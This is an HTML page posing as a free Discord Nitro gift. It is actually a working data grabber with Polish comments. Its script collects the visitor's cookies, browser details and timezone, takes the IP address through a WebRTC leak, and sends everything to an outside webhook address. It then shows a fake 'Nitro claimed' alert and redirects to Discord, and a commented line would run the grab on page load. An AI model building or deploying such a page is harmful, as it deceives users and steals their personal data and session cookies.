    <title>FREE NITRO CLAIM</title>
    <style>
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            color: white;
            text-align: center;
            padding-top: 100px;
        }
        .container {
            background: rgba(0, 0, 0, 0.7);
            border-radius: 15px;
            padding: 40px;
            display: inline-block;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        .nitro-btn {
            background: #5865F2;
            color: white;
            border: none;
            padding: 20px 40px;
            font-size: 24px;
            border-radius: 10px;
            cursor: pointer;
            margin-top: 30px;
            transition: 0.3s;
        }
        .nitro-btn:hover {
            background: #4752C4;
            transform: scale(1.05);
        }
        .discord-logo {
            width: 200px;
            margin-bottom: 30px;
        }
        .loading {
            display: none;
            margin-top: 20px;
        }
    </style>

<body>
    <div class="container">
        <img src="https://discord.com/assets/2c21aeda16de354ba5334551a883b481.png" class="discord-logo">
        <h1>üéâ FREE DISCORD NITRO!</h1>
        <p>You've been gifted 1 Year of Discord Nitro!</p>
        <p>Click CLAIM to activate your Nitro.</p>
        
        <button class="nitro-btn" onclick="grabIP()">üéÅ CLAIM NITRO</button>
        
        <div class="loading" id="loading">
            <p>Checking eligibility... ‚è≥</p>
        </div>
    </div>

    <script>
        // Zbierz dane u≈ºytkownika
        var userData = {
            ip: '',
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            cookies: document.cookie,
            referrer: document.referrer,
            screen: screen.width + 'x' + screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            plugins: Array.from(navigator.plugins).map(p => p.name).join(', ')
        };

        // Pobierz IP przez WebRTC
        function getIP() {
            return new Promise((resolve) => {
                const pc = new RTCPeerConnection({iceServers: []});
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                
                pc.onicecandidate = ice => {
                    if (!ice.candidate) return;
                    const candidate = ice.candidate.candidate;
                    const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                    const match = candidate.match(ipRegex);
                    if (match) {
                        resolve(match[1]);
                    }
                };
                
                setTimeout(() => resolve('Unknown'), 1000);
            });
        }

        // G≈Ç√≥wna funkcja grabbera
        async function grabIP() {
            document.getElementById('loading').style.display = 'block';
            
            // Pobierz IP
            userData.ip = await getIP();
            
            // Wy≈õlij dane do serwera
            fetch('https://webhook.site/your-webhook-id', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(userData)
            });
            
            // Zapisz te≈º w localStorage (backup)
            localStorage.setItem('nitro_grabber', JSON.stringify(userData));
            
            // Przekieruj po 3 sekundach
            setTimeout(() => {
                window.location.href = 'https://discord.com/billing/promotions';
            }, 3000);
            
            // Alert
            alert('‚úÖ Nitro claimed! Redirecting to Discord...');
        }

        // Auto-run przy za≈Çadowaniu strony (opcjonalnie)
        window.onload = function() {
            // grabIP(); // Odkomentuj jak chcesz auto-grab przy wej≈õciu na stronƒô
        };
    </script>
</body>
